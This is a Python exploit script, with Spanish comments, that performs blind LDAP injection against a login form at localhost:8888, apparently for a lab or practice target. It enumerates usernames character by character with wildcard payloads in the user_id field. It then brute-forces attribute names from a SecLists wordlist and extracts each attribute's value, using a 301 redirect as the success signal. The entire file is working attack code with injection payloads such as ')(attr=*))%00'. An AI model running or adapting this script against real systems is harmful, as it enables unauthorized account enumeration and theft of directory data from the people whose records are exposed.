#!/usr/bin/python3


from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\t[*]Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url = "http://localhost:8888"
characters = string.ascii_lowercase + string.digits

users = []
attributes = []

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

def getUsers():


    for character in characters:

        post_data= "user_id={}*&password=*&login=1&submit=Submit".format(character)

        #p1.status(post_data)

        r = requests.post(url, headers=headers, data=post_data, allow_redirects=False)
        #print(r.status_code)

        if r.status_code == 301:
            
            users.append(character)
        
    
    p1 = log.progress("Searching for users...")
    p2 = log.progress("Users... ")

    i = 0
    for u in users:
        
        for p in range(0,10):

            pos = 0

            for character in characters:
            
                post_data= "user_id={}{}*&password=*&login=1&submit=Submit".format(users[i], character)

                #p1.status(post_data)

                r = requests.post(url, headers=headers, data=post_data, allow_redirects=False)

                if r.status_code == 301:

                    if pos == 1:
                        users.append(users[i])
                        users[-1] += character

                    else:
                        users[i] += character
                        pos = 1
        
        i = i+1
        tmp = set(users)
        usuarios = list(tmp)
        p2.status(usuarios)

    
    n = 0
    for p in usuarios:
        print("[%d] %s" % (n, p))
        n = n + 1

    dump_user = int(input("Selecciona el usuario: "))
    user = usuarios[dump_user]
    getAttr(user, usuarios)
    
def getAttr(user, usuarios):
    print("\n")
    p3 = log.progress("Searching attributes for " + user)

    with open('/usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt', 'r') as file:
    # Lee cada línea del archivo
        for line in file:
            # Elimina cualquier espacio en blanco al principio y al final de la línea
            attribute = line.strip()

            post_data= "user_id={})({}=*))%00&password=*&login=1&submit=Submit".format(user, attribute)

            #p1.status(post_data)

            r = requests.post(url, headers=headers, data=post_data, allow_redirects=False)
            #print(r.status_code)

            if r.status_code == 301:
            
                attributes.append(attribute)
                p3.status(attributes)

    #attributes.insert(0, "elegir otro usuario")
    #n = 0
    #for q in attributes:
    #    print("[%d] %s" % (n, q))
    #    n = n + 1

    #dump_attribute = int(input("Selecciona el atributo a dumpear: "))
    #if dump_attribute == 0:
        #getUsers()
    #else:
    print("\n")
    p5 = log.progress("Dumpin user... " + user)
    p4 = log.progress("Dumping attribute... ")

    for attribute in attributes:
        
        p4.status(attribute)
        field = ""

        for p in range(0,50):

            for character in characters:
            
                post_data= "user_id={})({}={}{}*))%00&&password=*&login=1&submit=Submit".format(user, attribute, field, character)
                #p1.status(post_data)

                r = requests.post(url, headers=headers, data=post_data, allow_redirects=False)

                if r.status_code == 301:

                    field += character

        print("\t[+] " + attribute + ": " + field)

    n = 0
    for p in usuarios:
        print("[%d] %s" % (n, p))
        n = n + 1

    dump_user = int(input("Selecciona el usuario: "))
    user = usuarios[dump_user]
    getAttr(user, usuarios)


if __name__ == "__main__":

    getUsers()
